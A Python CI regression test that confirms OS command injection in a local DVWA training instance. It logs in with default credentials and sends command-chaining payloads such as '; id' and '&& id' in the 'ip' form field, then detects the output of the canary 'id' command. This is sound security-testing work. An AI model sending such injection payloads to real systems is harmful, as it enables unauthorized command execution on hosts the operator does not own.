#!/usr/bin/env python3
"""
DVWA Command Injection — Security Regression Test
=====================================================

Purpose
-------
Verifies that the DVWA "Command Injection" page (security=low) is reachable
and that the `ip` parameter allows arbitrary OS command execution via
shell metacharacter injection, using `id` as the canary command.

This is intended to run against a LOCAL, AUTHORIZED, INTENTIONALLY
VULNERABLE training instance of DVWA (e.g. http://127.0.0.1:8080).
Do not point this at any host you do not own or have explicit written
authorization to test.

CI/CD usage
-----------
Exit codes:
    0 -> Command injection NOT confirmed (injected command did not execute)
         -- "pass" for a hardened build, "fail" for an intentionally-vulnerable one.
    1 -> Command injection CONFIRMED (injected command output detected in
         response) -- treat as a regression if this appears on a build
         that is supposed to be patched.
    2 -> Script/environment error (couldn't log in, target unreachable, etc.)
"""

import re
import sys
import argparse
from urllib.parse import urljoin
from dvwa_common import log, get_csrf_token, login, set_security_level
from pathlib import Path
from sarif_utils import write_finding

import requests


DEFAULT_BASE_URL = "http://127.0.0.1:8080"
DEFAULT_USERNAME = "admin"
DEFAULT_PASSWORD = "password"  # DVWA's documented default creds

# `id` output looks like: uid=33(www-data) gid=33(www-data) groups=33(www-data)
CANARY_PATTERN = re.compile(r"uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)")

EXEC_PATH_CANDIDATES = [
    "/vulnerabilities/exec/",
    "/vulnerabilities/exec/index.php",
    "/dvwa/vulnerabilities/exec/",
    "/dvwa/vulnerabilities/exec/index.php",
]

EXEC_PAGE_MARKER = re.compile(r"Vulnerability:\s*Command\s*Injection", re.IGNORECASE)

# Separator payloads to try chaining an extra command onto the expected `ping`.
# Covers the common low/medium-level DVWA bypass variants.
SEPARATOR_PAYLOADS = [
    "; id",
    "&& id",
    "| id",
    "%0a id",   # URL-encoded newline, sometimes survives naive blacklist filters
]

TARGET_HOST = "127.0.0.1"


def discover_exec_url(session: requests.Session, base_url: str) -> str:
    """
    Try the common DVWA path layouts and return the first one that actually
    renders the Command Injection page (checked by content marker, not just
    HTTP status).
    """
    for path in EXEC_PATH_CANDIDATES:
        url = urljoin(base_url, path)
        try:
            resp = session.get(url, timeout=10)
        except requests.exceptions.RequestException:
            continue

        log(f"Probing {url} -> status={resp.status_code}, final_url={resp.url}")

        if resp.status_code == 200 and EXEC_PAGE_MARKER.search(resp.text):
            log(f"Confirmed working Command Injection endpoint: {url}")
            return url

    raise RuntimeError(
        "Could not locate the Command Injection page automatically. "
        "Log in via browser, click 'Command Injection' in the left nav, "
        "and pass its exact path via --exec-path."
    )


def submit_payload(session: requests.Session, exec_url: str, ip_value: str) -> requests.Response:
    """
    Submits the Command Injection form. DVWA's exec page expects a POST with
    `ip` and `Submit`, plus a CSRF token on versions that include one.
    """
    get_resp = session.get(exec_url, timeout=10)
    get_resp.raise_for_status()
    token = get_csrf_token(get_resp.text)
    
    data = {"ip": ip_value, "Submit": "Submit"}
    if token:
        data["user_token"] = token

    resp = session.post(exec_url, data=data, timeout=15)
    resp.raise_for_status()
    return resp


def get_baseline_length(session: requests.Session, exec_url: str) -> int:
    """
    Submit a plain, non-malicious ping target first, so we have a known-safe
    Content-Length to diff against. A real injection should produce a
    response meaningfully larger (and pattern-matching) relative to this
    baseline, not just a 200 status.
    """
    resp = submit_payload(session, exec_url, TARGET_HOST)
    log(f"Baseline request: status={resp.status_code}, final_url={resp.url}")
    snippet = re.sub(r"\s+", " ", resp.text[:300]).strip()
    log(f"Baseline response snippet: {snippet!r}")
    return len(resp.content)


def run_cmdi_poc(session: requests.Session, base_url: str, exec_path_override: str | None = None) -> tuple[bool, str, dict]:
    """
    Sends command-chaining payloads against the Command Injection endpoint,
    attempting to execute `id` alongside the expected `ping` command via the
    unsanitized `ip` parameter.
    """
    exec_url = urljoin(base_url, exec_path_override) if exec_path_override else discover_exec_url(session, base_url)
    baseline_length = get_baseline_length(session, exec_url)
    log(f"Baseline (clean ping) response length: {baseline_length} bytes")

    report = {"baseline_length": baseline_length, "attempts": []}

    for separator_payload in SEPARATOR_PAYLOADS:
        payload = f"{TARGET_HOST} {separator_payload}"
        resp = submit_payload(session, exec_url, payload)
        length = len(resp.content)
        delta = length - baseline_length
        matched = bool(CANARY_PATTERN.search(resp.text))

        log(f"ip={payload!r} -> {length} bytes (Δ{delta:+d} vs baseline), pattern_match={matched}")
        report["attempts"].append({
            "payload": payload,
            "content_length": length,
            "delta_vs_baseline": delta,
            "pattern_matched": matched,
        })

        if matched and delta > 0:
            return True, resp.text, report

    return False, resp.text, report


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--base-url", default=DEFAULT_BASE_URL, help="DVWA base URL (default: %(default)s)")
    parser.add_argument("--username", default=DEFAULT_USERNAME, help="DVWA login username")
    parser.add_argument("--password", default=DEFAULT_PASSWORD, help="DVWA login password")
    parser.add_argument("--verbose", action="store_true", help="Print full response body on confirmation")
    parser.add_argument("--exec-path", default=None,
                         help="Exact path to the Command Injection page, e.g. /dvwa/vulnerabilities/exec/ "
                              "(skips auto-discovery if provided)")
    parser.add_argument("--security-level", default="low", choices=["low", "medium", "high", "impossible"],
                         help="DVWA security level to set before testing (default: %(default)s)")
    parser.add_argument("--finding-out", default=None,
                         help="Path to write a JSON finding file for SARIF aggregation")
    args = parser.parse_args()

    session = requests.Session()

    try:
        if not login(session, args.base_url, args.username, args.password):
            log("Aborting: authentication failed.")
            return 2

        if not set_security_level(session, args.base_url, args.security_level):
            log("Aborting: could not set security level.")
            return 2

        confirmed, body, report = run_cmdi_poc(session, args.base_url, args.exec_path)

    except requests.exceptions.RequestException as exc:
        log(f"Request error: {exc}")
        return 2
    except RuntimeError as exc:
        log(str(exc))
        return 2

    print("\n" + "=" * 70)
    print(f"Baseline response length: {report['baseline_length']} bytes")
    for attempt in report["attempts"]:
        flag = "LEAK" if attempt["pattern_matched"] and attempt["delta_vs_baseline"] > 0 else "    "
        print(f"[{flag}] ip={attempt['payload']!r:40} "
              f"len={attempt['content_length']:>6} (Δ{attempt['delta_vs_baseline']:+d})")
    print("=" * 70)

    if args.finding_out:
        write_finding(
            path=Path(args.finding_out),
            rule_id="dvwa-cmdi-001",
            rule_name="Command Injection",
            message="OS command injection via unsanitized 'ip' parameter on DVWA Command Injection endpoint",
            uri="vulnerabilities/exec/",
            confirmed=confirmed,
            security_level=args.security_level,
        )

    if confirmed:
        print("[CONFIRMED] Command Injection executed an unauthorized command.")
        print("=" * 70)
        for line in body.splitlines():
            if CANARY_PATTERN.search(line.strip()):
                print(line.strip())
        print("=" * 70 + "\n")
        return 1
    else:
        print("[NOT CONFIRMED] Payloads did not produce a content-length increase with a matching canary pattern.")
        print("=" * 70 + "\n")
        return 0


if __name__ == "__main__":
    sys.exit(main())
